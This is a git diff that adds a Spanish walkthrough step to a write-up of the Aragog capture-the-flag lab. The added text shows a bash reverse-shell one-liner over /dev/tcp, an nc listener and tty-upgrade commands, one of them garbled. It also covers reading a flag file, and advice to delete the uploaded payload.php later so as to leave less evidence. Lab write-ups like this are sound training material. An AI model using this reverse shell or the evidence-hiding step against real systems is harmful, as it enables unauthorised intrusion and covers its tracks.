@@ -134,15 +134,50 @@ Si entramos a la url : `http://wordpress.aragog.hogwarts/blog/wp-content/plugins
 ![13 cap_cmdURL](https://github.com/Vicctoriaa/VISMA/assets/153718557/ae1e931c-e063-453a-8bf3-98313735ba11)
 > En este ejemplo se muestra el comando `hostname -l` que nos dice la ip
 
+Una vez hemos verificado que tiene 2 interfaces de red vamos a entablar una reverse Shell.
+Para ello nos vamos al puerto 443 y ponemos un one liner para una reverse Shell:
+```
+bash -c "bash -i >& /dev/tcp/IP_DE_LA_ARAGOG/443 0>&1"
+```
+Una vez ejecutamos el comando podemos observar que hemos obtenido una reverse shell
+```
+nc -nvlp 443
+```
+esta Shell no es del todo interactiva ya que no podemos hacer ctrl c, ctrl l, ctrl u, no podemos utilizar las flechas para ir al historial de comandos, etc...
+Para solucionar esto se hace un tratamiento de la tty, con tratamiento de la tty básicamente nos referimos a la configuración y gestión de la terminal.
+Para ello hay que hacer los siguientes comandos
+```
+‎script /dev/null -c bash
+```
+ctrl + z
+```
+stty raw -echo; fg
+reset xterm
+```
+‎Una vez hecho esto solo nos queda resetear el tamaño de la terminal, para eso primero debemos saber el tamaño de nuestra terminal por lo que en una terminal aparte ejecutamos el comando `stty size`
 
+Reseteamos la Variable de entrno TERM para que sea igual a “xterm”, xterm es un emulador de terminal muy utilizado que es el que nos permite limpiar pantalla con las hotkeys “ctrl + L” usar “ctrl + C”, poder usar las flechas para moverse, etc.
+‎
+```
+expot TERM=xterm s$ -sitty rows 64 columns 253wordpress/wp-content/plugins/wp-file-manager/lib/files
+```
+Una vez hecho eso reseteamos el tamaño de la terminal a nuestro tamaño de la ventana y ya está. Ya tenemos una reverse Shell totalmente interactiva que si hacemos “ctrl + c” no se nos cierra.
 
-
-
+Nos dirigimos a home, en caso de que no estemos dentro hacemos `cd /home/`
+al hacer `ls` vemos un directorio llamado hagrid98, si repetimos el comando `ls` vemos el .txt, para verlo haremos `cat horcrux1.txt`
 ‎ 
-‎ ‎ 
-‎ ‎ ‎
-‎ 
-‎ 
+Nos encontramos que esta en base64, por lo que para pasarlo a texto legible o “human readable” debemos de ejecutar el comando:
+```
+echo “texto en base 64” | base64 -d; echo
+```
+> El -d es para decodearlo y el echo del final es para reiniciar la salida
+
+![14 cap_hagrid](https://github.com/Vicctoriaa/VISMA/assets/153718557/115ac27c-5cd2-4c13-a780-3ba85437b622)
+
+Buscaremos si encontramos algo útil, como esta corriendo apache debemos buscar el directorio de apache que es “/etc/apache2” una vez dentro encontramos que hay un directorio llamado “sites-enabled” entramos y dentro hay un wordpress.conf, al hacerle un cat nos revela que el directorio donde esta montado el wordpress es “/usr/share/wordpress” si entramos ahí encontramos que hay un direcorio interesante llamado “wp-content”, si entramos y nos dirigimos a plugins>wp-file-manager>lib>files encontramos nuestro payload.php, de momento no lo borraremos porque sin el no podemos tener la reverse Shell, pero una vez escalemos y tengamos conexión por ssh debemos borrarlo para dejar menos evidencias.
+
+
+
 
 #===============================MIS-REDES==================================#
 
